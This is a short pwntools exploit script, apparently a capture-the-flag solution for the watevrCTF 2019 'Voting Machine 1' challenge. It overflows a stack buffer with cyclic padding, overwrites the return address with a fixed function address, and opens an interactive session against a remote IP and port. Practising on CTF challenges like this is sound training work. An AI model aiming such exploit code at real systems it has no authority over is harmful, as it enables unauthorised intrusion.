from pwn import *

# io=process("./[watevrCTF 2019]Voting Machine 1")
io=remote("1.14.71.254",28068)
func_addr=0x400807
# ret_addr=0x400656
payload=cyclic(0x2+0x8)+p64(func_addr)
# payload=cyclic(0x2+0x8)+p64(ret_addr)+p64(func_addr)
io.recv()
io.sendline(payload)
io.interactive()